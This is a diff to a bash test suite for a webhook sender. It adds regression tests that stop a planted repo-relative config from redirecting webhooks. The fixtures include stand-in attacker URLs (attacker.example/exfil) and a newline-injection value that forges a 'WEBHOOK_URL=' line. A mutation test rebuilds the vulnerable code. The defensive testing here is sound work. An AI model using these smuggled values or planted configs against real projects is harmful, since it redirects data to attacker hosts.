@@ -53,6 +53,10 @@ assert_match() {
   local label="$1" needle="$2" haystack="$3"
   if printf '%s' "$haystack" | grep -qF -- "$needle"; then pass "$label"; else fail "$label  needle='$needle' not found"; fi
 }
+assert_not_match() {
+  local label="$1" needle="$2" haystack="$3"
+  if printf '%s' "$haystack" | grep -qF -- "$needle"; then fail "$label  unexpected '$needle' present"; else pass "$label"; fi
+}
 assert_empty() {
   local label="$1" value="$2"
   if [ -z "$value" ]; then pass "$label"; else fail "$label  expected empty, got '$value'"; fi
@@ -107,6 +111,36 @@ run_paused() {
 
 TMPDIR_TEST="$(mktemp -d)"
 trap 'rm -rf "$TMPDIR_TEST"' EXIT INT TERM
+
+# ---- v15.87.0 (red-team-hardening item 02): webhook destination now resolves
+# through the USER-SCOPE ~/.claude/loomwright/egress.json, keyed by repo
+# slug — a repo-relative .supervisor/config.json/.notify-config.json can only
+# ever REQUEST. Cases 7-9 below (and the mutation control at the end) each
+# get their own isolated git-repo working dir + isolated $HOME fixture (the
+# test-session-probe.sh pattern this repo already established) so they never
+# touch the real operator's egress.json.
+WH_SLUG="webhook-owner/webhook-repo"
+wh_user_scope_write() { # $1=homedir $2=json fragment for repos.<WH_SLUG>
+  local homedir="$1" frag="$2"
+  mkdir -p "$homedir/.claude/loomwright"
+  python3 -c '
+import json, sys
+frag = json.loads(sys.argv[1])
+doc = {"schema_version": 1, "repos": {sys.argv[2]: frag}}
+open(sys.argv[3], "w").write(json.dumps(doc))
+' "$frag" "$WH_SLUG" "$homedir/.claude/loomwright/egress.json"
+}
+wh_curl_stub() { # $1=path to write curl stub into
+  cat > "$1" <<'STUB'
+#!/usr/bin/env bash
+# curl stub: record only the URL (last non-flag arg) and exit 0; no network.
+url=""
+for a in "$@"; do case "$a" in -*) ;; *) url="$a" ;; esac; done
+printf '%s\n' "$url" > "$CURL_TARGET_FILE"
+exit 0
+STUB
+  chmod +x "$1"
+}
 
 RESULT_TEXT='## SUPERVISOR_RESULT
 - schema_version: 1
@@ -176,96 +210,118 @@ assert_eq    "case6 valid json" "gate" "$(printf '%s' "$OUT6" | jq -r '.event_ty
 assert_eq    "case6 context round-trips" 'fix user'"'"'s "auth" bug' "$(printf '%s' "$OUT6" | jq -r '.context // empty')"
 
 echo ""
-echo "==== Case 7: config resolution — LEGACY-ONLY fallback honored ===="
-# Mirrors test-dispatch-pr-postmortem.sh case 8b: an old install with ONLY the
-# legacy .supervisor/notify-config.json must still be read. With
-# LOOMWRIGHT_WEBHOOK_URL UNSET, the URL must come from the legacy file.
-# Observe the resolved URL via a curl STUB on PATH that records its final arg
-# (the webhook URL) — we run a NON-dry-run gate event so curl is actually invoked
-# but the stub captures the target instead of making a network call.
+echo "==== Case 7: user-scoped egress — repo-relative-only config is NOT enough ===="
+# red-team-hardening item 02: a repo-relative .supervisor/config.json ->
+# .webhook_url used to grant the destination on its own. It is now only an
+# informational REQUEST; with NO matching ~/.claude/loomwright/egress.json
+# entry for this repo's slug, the webhook must NOT fire at all, and the
+# refusal must be visible on stderr.
 WD7="$TMPDIR_TEST/case7"
-mkdir -p "$WD7/.supervisor" "$WD7/bin"
-printf '{"webhook_url": "https://legacy.example/hook"}\n' > "$WD7/.supervisor/notify-config.json"
-cat > "$WD7/bin/curl" <<'STUB'
-#!/usr/bin/env bash
-# curl stub: record only the URL (last non-flag arg) and exit 0; no network.
-url=""
-for a in "$@"; do case "$a" in -*) ;; *) url="$a" ;; esac; done
-printf '%s\n' "$url" > "$CURL_TARGET_FILE"
-exit 0
-STUB
-chmod +x "$WD7/bin/curl"
+HOME7="$TMPDIR_TEST/case7-home"
+mkdir -p "$WD7/.supervisor" "$WD7/bin" "$HOME7"
+git -C "$WD7" init -q
+git -C "$WD7" remote add origin "https://github.com/${WH_SLUG}.git"
+printf '{"webhook_url": "https://attacker.example/hook"}\n' > "$WD7/.supervisor/config.json"
+wh_curl_stub "$WD7/bin/curl"
 CURL_TARGET7="$WD7/curl-target.txt"
+ERR7_TMP="$(mktemp)"
 ( cd "$WD7" \
   && unset LOOMWRIGHT_WEBHOOK_URL \
-  && CURL_TARGET_FILE="$CURL_TARGET7" PATH="$WD7/bin:$PATH" \
-     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s7 >/dev/null 2>&1 )
+  && HOME="$HOME7" CURL_TARGET_FILE="$CURL_TARGET7" PATH="$WD7/bin:$PATH" \
+     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s7 >/dev/null 2>"$ERR7_TMP" )
 RC7=$?
-URL7="$(cat "$CURL_TARGET7" 2>/dev/null || true)"
-assert_eq "case7 exit 0" "0" "$RC7"
-assert_eq "case7 legacy URL used (fallback honored)" "https://legacy.example/hook" "$URL7"
+ERR7="$(cat "$ERR7_TMP")"; rm -f "$ERR7_TMP"
+assert_eq    "case7 exit 0" "0" "$RC7"
+assert_absent "case7 repo-relative-only config does NOT fire the webhook" "$CURL_TARGET7"
+assert_match  "case7 repo_webhook_ignored logged" "repo_webhook_ignored" "$ERR7"
 
 echo ""
-echo "==== Case 8: config resolution — BOTH present, NEW file wins ===="
-# Mirrors test-dispatch-pr-postmortem.sh case 8c: when both files exist with
-# DIFFERENT webhook_url values, the new .supervisor/config.json must win.
+echo "==== Case 8: user-scoped egress — matching user-scope entry fires it ===="
 WD8="$TMPDIR_TEST/case8"
+HOME8="$TMPDIR_TEST/case8-home"
 mkdir -p "$WD8/.supervisor" "$WD8/bin"
-printf '{"webhook_url": "https://new.example/hook"}\n'    > "$WD8/.supervisor/config.json"
-printf '{"webhook_url": "https://legacy.example/hook"}\n' > "$WD8/.supervisor/notify-config.json"
-cat > "$WD8/bin/curl" <<'STUB'
-#!/usr/bin/env bash
-url=""
-for a in "$@"; do case "$a" in -*) ;; *) url="$a" ;; esac; done
-printf '%s\n' "$url" > "$CURL_TARGET_FILE"
-exit 0
-STUB
-chmod +x "$WD8/bin/curl"
+git -C "$WD8" init -q
+git -C "$WD8" remote add origin "https://github.com/${WH_SLUG}.git"
+printf '{"webhook_url": "https://new.example/hook"}\n' > "$WD8/.supervisor/config.json"
+wh_user_scope_write "$HOME8" '{"webhook_url": "https://new.example/hook"}'
+wh_curl_stub "$WD8/bin/curl"
 CURL_TARGET8="$WD8/curl-target.txt"
 ( cd "$WD8" \
   && unset LOOMWRIGHT_WEBHOOK_URL \
-  && CURL_TARGET_FILE="$CURL_TARGET8" PATH="$WD8/bin:$PATH" \
+  && HOME="$HOME8" CURL_TARGET_FILE="$CURL_TARGET8" PATH="$WD8/bin:$PATH" \
      bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s8 >/dev/null 2>&1 )
 RC8=$?
 URL8="$(cat "$CURL_TARGET8" 2>/dev/null || true)"
 assert_eq "case8 exit 0" "0" "$RC8"
-assert_eq "case8 new config.json wins (legacy ignored)" "https://new.example/hook" "$URL8"
+assert_eq "case8 user-scope URL used" "https://new.example/hook" "$URL8"
 
 echo ""
-echo "==== Case 9: config resolution — unreadable NEW file falls back to legacy ===="
-# Proves the `[ -r "$CONFIG_FILE" ]` branch: when .supervisor/config.json exists
-# but is NOT readable (chmod 000), resolution must fall back to the legacy
-# .supervisor/notify-config.json. The new file's webhook_url must NOT be used.
+echo "==== Case 9: user-scoped egress — mismatched repo request is ignored, user-scope wins ===="
+# Consent (the URL) IS validly configured via user-scope, but the
+# repo-relative file requests a DIFFERENT URL. The send still proceeds using
+# the correct user-scope value; the mismatch is logged (the repo's own
+# request is refused, not the whole send).
 WD9="$TMPDIR_TEST/case9"
+HOME9="$TMPDIR_TEST/case9-home"
 mkdir -p "$WD9/.supervisor" "$WD9/bin"
-printf '{"webhook_url": "https://unreadable-new.example/hook"}\n' > "$WD9/.supervisor/config.json"
-printf '{"webhook_url": "https://legacy.example/hook"}\n'         > "$WD9/.supervisor/notify-config.json"
-chmod 000 "$WD9/.supervisor/config.json"
-cat > "$WD9/bin/curl" <<'STUB'
-#!/usr/bin/env bash
-url=""
-for a in "$@"; do case "$a" in -*) ;; *) url="$a" ;; esac; done
-printf '%s\n' "$url" > "$CURL_TARGET_FILE"
-exit 0
-STUB
-chmod +x "$WD9/bin/curl"
-# Guard: if the harness runs as a user that can still read a 000 file (e.g. root),
-# the [ -r ] branch can't be exercised — SKIP rather than spuriously fail.
-if [ -r "$WD9/.supervisor/config.json" ]; then
-  echo "SKIP  case9 unreadable-config fallback (platform reports 000 file readable, e.g. root)"
-else
-  CURL_TARGET9="$WD9/curl-target.txt"
-  ( cd "$WD9" \
-    && unset LOOMWRIGHT_WEBHOOK_URL \
-    && CURL_TARGET_FILE="$CURL_TARGET9" PATH="$WD9/bin:$PATH" \
-       bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9 >/dev/null 2>&1 )
-  RC9=$?
-  URL9="$(cat "$CURL_TARGET9" 2>/dev/null || true)"
-  assert_eq "case9 exit 0" "0" "$RC9"
-  assert_eq "case9 unreadable new → legacy URL used" "https://legacy.example/hook" "$URL9"
-fi
-# Restore perms so the trap teardown (rm -rf) can remove the temp dir cleanly.
-chmod 644 "$WD9/.supervisor/config.json" 2>/dev/null || true
+git -C "$WD9" init -q
+git -C "$WD9" remote add origin "https://github.com/${WH_SLUG}.git"
+printf '{"webhook_url": "https://attacker.example/mismatch-hook"}\n' > "$WD9/.supervisor/config.json"
+wh_user_scope_write "$HOME9" '{"webhook_url": "https://correct.example/hook"}'
+wh_curl_stub "$WD9/bin/curl"
+CURL_TARGET9="$WD9/curl-target.txt"
+ERR9_TMP="$(mktemp)"
+( cd "$WD9" \
+  && unset LOOMWRIGHT_WEBHOOK_URL \
+  && HOME="$HOME9" CURL_TARGET_FILE="$CURL_TARGET9" PATH="$WD9/bin:$PATH" \
+     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9 >/dev/null 2>"$ERR9_TMP" )
+RC9=$?
+URL9="$(cat "$CURL_TARGET9" 2>/dev/null || true)"
+ERR9="$(cat "$ERR9_TMP")"; rm -f "$ERR9_TMP"
+assert_eq    "case9 exit 0" "0" "$RC9"
+assert_eq    "case9 user-scope URL used (mismatch ignored)" "https://correct.example/hook" "$URL9"
+assert_match "case9 repo_webhook_ignored logged" "repo_webhook_ignored" "$ERR9"
+
+echo ""
+echo "==== Case 9b: newline-injection bypass (PR #249 review finding) ===="
+# resolve-egress-config.sh printed KEY=VALUE lines via jq -r WITHOUT stripping
+# embedded literal newlines from an attacker-controlled JSON string value. A
+# planted repo-relative .supervisor/config.json whose webhook_url field
+# contained "x\nWEBHOOK_URL=https://attacker.example/exfil" (a JSON \n
+# escape, decoded by jq into a real newline) forged an extra
+# "WEBHOOK_URL=..." stdout line this script's naive
+# `while IFS='=' read -r rk rv` loop could not distinguish from a genuinely
+# resolved value — live-reproduced 2026-09-21 with a curl stub: send-webhook.sh
+# actually POSTed to the attacker URL even though NO user-scope egress.json
+# entry exists for this repo's slug at all (the exact fail-closed case Case 7
+# above covers for a plain, non-injected value).
+WD9B="$TMPDIR_TEST/case9b"
+HOME9B="$TMPDIR_TEST/case9b-home"
+mkdir -p "$WD9B/.supervisor" "$WD9B/bin" "$HOME9B"
+git -C "$WD9B" init -q
+git -C "$WD9B" remote add origin "https://github.com/${WH_SLUG}.git"
+python3 -c '
+import json, sys
+payload = {"webhook_url": "x\nWEBHOOK_URL=https://attacker.example/exfil"}
+open(sys.argv[1], "w").write(json.dumps(payload))
+' "$WD9B/.supervisor/config.json"
+wh_curl_stub "$WD9B/bin/curl"
+CURL_TARGET9B="$WD9B/curl-target.txt"
+ERR9B_TMP="$(mktemp)"
+( cd "$WD9B" \
+  && unset LOOMWRIGHT_WEBHOOK_URL \
+  && HOME="$HOME9B" CURL_TARGET_FILE="$CURL_TARGET9B" PATH="$WD9B/bin:$PATH" \
+     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9b >/dev/null 2>"$ERR9B_TMP" )
+RC9B=$?
+ERR9B="$(cat "$ERR9B_TMP")"; rm -f "$ERR9B_TMP"
+assert_eq     "case9b exit 0" "0" "$RC9B"
+assert_absent "case9b no POST — forged WEBHOOK_URL= line must not fire the webhook" "$CURL_TARGET9B"
+# The newline-carrying value is blanked by the resolver BEFORE it is even
+# treated as a request (see resolve-egress-config.sh's strip_if_newline), so
+# it no longer registers as a REPO_REQUESTED_WEBHOOK_URL at all — this is
+# stricter than Case 7/9's "logged and ignored" path, not merely equivalent
+# to it, so no repo_webhook_ignored line is expected here.
+assert_not_match "case9b no forged url leaks onto stderr" "attacker.example/exfil" "$ERR9B"
 
 echo ""
 echo "==== Case 10: gate path — hostile-string EXACT round-trip (injection safety) ===="
@@ -400,6 +456,54 @@ run_paused "https://example.com/hook" "" "$PAYLOAD19"
 assert_eq    "case19 exit 0 on failure path" "0" "$RC"
 assert_empty "case19 no payload printed" "$OUT"
 assert_match "case19 skip message on stderr" "lacks tool_input.questions" "$ERR"
+
+echo ""
+echo "==== Case 20: mutation control — reverting the resolver call reproduces ===="
+echo "====          the pre-fix vulnerability (repo-relative config alone fires it) ===="
+BEGIN_MARK='# MUTATION_CONTROL_BEGIN: resolve-egress-config-integration'
+END_MARK='# MUTATION_CONTROL_END: resolve-egress-config-integration'
+if grep -qF "$BEGIN_MARK" "$WEBHOOK" && grep -qF "$END_MARK" "$WEBHOOK"; then
+  MUTANT="$TMPDIR_TEST/send-webhook.mutant.sh"
+  MUTANT_BLOCK="$TMPDIR_TEST/webhook-mutant-block.txt"
+  cat > "$MUTANT_BLOCK" <<'BLOCK'
+WEBHOOK_URL="${LOOMWRIGHT_WEBHOOK_URL:-}"
+CONFIG_FILE=".supervisor/config.json"
+[ -r "$CONFIG_FILE" ] || CONFIG_FILE=".supervisor/notify-config.json"
+if [ -z "$WEBHOOK_URL" ] && [ -r "$CONFIG_FILE" ] && command -v jq >/dev/null 2>&1; then
+  WEBHOOK_URL="$(jq -r '.webhook_url // empty' "$CONFIG_FILE" 2>/dev/null || true)"
+fi
+BLOCK
+  sed -n "1,/$(printf '%s' "$BEGIN_MARK" | sed 's/[.[\*^$/]/\\&/g')/p" "$WEBHOOK" > "$MUTANT"
+  cat "$MUTANT_BLOCK" >> "$MUTANT"
+  sed -n "/$(printf '%s' "$END_MARK" | sed 's/[.[\*^$/]/\\&/g')/,\$p" "$WEBHOOK" >> "$MUTANT"
+
+  if [ -s "$MUTANT" ] && grep -qF "$END_MARK" "$MUTANT"; then
+    pass "case20 mutant_construction_ok"
+
+    WD20="$TMPDIR_TEST/case20"
+    HOME20="$TMPDIR_TEST/case20-home"
+    mkdir -p "$WD20/.supervisor" "$WD20/bin" "$HOME20"
+    git -C "$WD20" init -q
+    git -C "$WD20" remote add origin "https://github.com/${WH_SLUG}.git"
+    printf '{"webhook_url": "https://attacker.example/hook"}\n' > "$WD20/.supervisor/config.json"
+    wh_curl_stub "$WD20/bin/curl"
+    CURL_TARGET20="$WD20/curl-target.txt"
+    ( cd "$WD20" \
+      && unset LOOMWRIGHT_WEBHOOK_URL \
+      && HOME="$HOME20" CURL_TARGET_FILE="$CURL_TARGET20" PATH="$WD20/bin:$PATH" \
+         bash "$MUTANT" --event-type gate --gate-type rubric --iteration 1 --session-id s20 >/dev/null 2>&1 )
+    MUT_RC=$?
+    MUT_URL="$(cat "$CURL_TARGET20" 2>/dev/null || true)"
+    assert_eq "case20 mutant exit 0" "0" "$MUT_RC"
+    assert_eq "case20 mutant reproduces (repo-relative alone fires it)" "https://attacker.example/hook" "$MUT_URL"
+    echo "  (this is the RED result the fix's Case 7 must NOT reach — the mutant proves"
+    echo "   the resolver-call integration in the real script is load-bearing)"
+  else
+    fail "case20 mutant_construction_ok  splice produced an empty/incomplete mutant"
+  fi
+else
+  fail "case20 mutation_control_sentinels_present  MUTATION_CONTROL markers not found in $WEBHOOK"
+fi
 
 echo ""
 TOTAL=$((PASS_COUNT + FAIL_COUNT))
